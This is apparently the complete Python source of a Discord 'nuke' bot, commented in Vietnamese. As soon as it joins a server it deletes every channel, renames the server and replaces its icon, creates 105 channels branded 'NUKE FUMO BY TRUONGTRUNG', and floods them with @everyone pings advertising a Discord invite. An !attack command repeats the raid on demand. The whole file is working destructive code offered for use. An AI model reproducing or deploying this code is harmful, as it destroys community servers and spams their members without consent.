import discord
from discord.ext import commands, tasks
import json
import asyncio
import os
import time
from datetime import datetime, timedelta
import random

IMAGE_URL2 = "https://discord.com/invite/GkMUrP5wjh"

last_attack_times = {}

async def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

async def perform_attack(guild, config):
    print('Thực hiện tấn công vào bang hội đang ở:', guild.name, guild.id)
    delete_channels = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_channels)
    await guild.edit(name=config['newServerName'])
    with open('./icon.jpg', 'rb') as f:
        await guild.edit(icon=f.read())
    channel_names = ['NUKE FUMO BY TRUONGTRUNG'] * 105
    create_channels = [guild.create_text_channel(name) for name in channel_names]
    new_channels = await asyncio.gather(*create_channels)
    for channel in new_channels:
        for _ in range(10):
            await channel.send("@everyone @here\n" + IMAGE_URL2)
            await asyncio.sleep(2)

class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        help_message = """
# Các lệnh miễn phí có sẵn:
```!attack``` - Thực hiện một cuộc tấn công vào máy chủ
```!unban_all``` - Bỏ cấm tất cả người dùng trong máy chủ
```!help``` - Hiển thị thông báo trợ giúp này
        """
        await self.get_destination().send(help_message)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=CustomHelpCommand())

@bot.event
async def on_guild_channel_create(channel):
    for _ in range(10):
        await channel.send(f"@everyone @here\n" + IMAGE_URL2)
        await asyncio.sleep(5)

async def create_channel(guild, name, perms):
    try:
        channel = await guild.create_text_channel(name=name, overwrites=perms)
        print(f"Created channel: {name}")
    except discord.Forbidden:
        print(f"Cannot create channel: {name}")
        return
    for c in guild.channels:
        if c.id != channel.id:
            for _ in range(10):
                await c.send(f"@everyone @here!\n" + IMAGE_URL2)
                await asyncio.sleep(2)

async def main():
    config_data = await load_config()

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} đã sẵn sàng. [Version: V2.1]')
        await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="gg.gg/rspvn | !help"))

    @bot.event
    async def on_guild_join(guild):
        print(f'Bot đã tham gia máy chủ: {guild.name} ({guild.id})')
        await perform_attack(guild, await load_config())
        await leave_guild_after_delay(guild, 2 * 60 * 60)  # 2 giờ

    @bot.command(name='attack')
    @commands.cooldown(rate=1, per=180.0, type=commands.BucketType.guild)
    async def attack(ctx):
        guild_id = ctx.guild.id
        current_time = time.time()

        if guild_id in last_attack_times:
            elapsed_time = current_time - last_attack_times[guild_id]
            if elapsed_time < 180:
                await ctx.send(f'Vui lòng chờ {180 - int(elapsed_time)} giây nữa trước khi sử dụng lại lệnh này.')
                return

        await perform_attack(ctx.guild, config_data)
        last_attack_times[guild_id] = current_time

    @attack.error
    async def attack_error(ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"Lệnh attack đang hồi chiêu. Vui lòng chờ {error.retry_after:.2f} giây.")
        else:
            raise error

    @bot.command()
    @commands.has_permissions(ban_members=True)
    async def unban_all(ctx):
        try:
            banned_users = [entry async for entry in ctx.guild.bans()]
            if not banned_users:
                await ctx.send("Không có người dùng bị cấm.")
                return
            for ban_entry in banned_users:
                user = ban_entry.user
                try:
                    await ctx.guild.unban(user)
                    await ctx.send(f"Đã Unban {user.name}#{user.discriminator}.")
                except discord.Forbidden:
                    await ctx.send(f"Không thể Unban {user.name}#{user.discriminator}. Permission denied.")
                except discord.HTTPException as e:
                    await ctx.send(f"Thất bại Unban {user.name}#{user.discriminator}. HTTP Exception: {e}")
            await ctx.send("Tất cả các thành viên bỏ cấm không bị cản trở.")
        except Exception as e:
            await ctx.send(f"Đã xảy ra lỗi: {e}")

    @tasks.loop(seconds=86400)  
    async def remove_expired_premium():
        pass  

    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return

        if message.content.startswith('!'):
            await message.delete()

        await bot.process_commands(message)

    async def leave_guild_after_delay(guild, delay):
        await asyncio.sleep(delay)
        await guild.leave()

    await bot.start(config_data['token'])

asyncio.run(main())
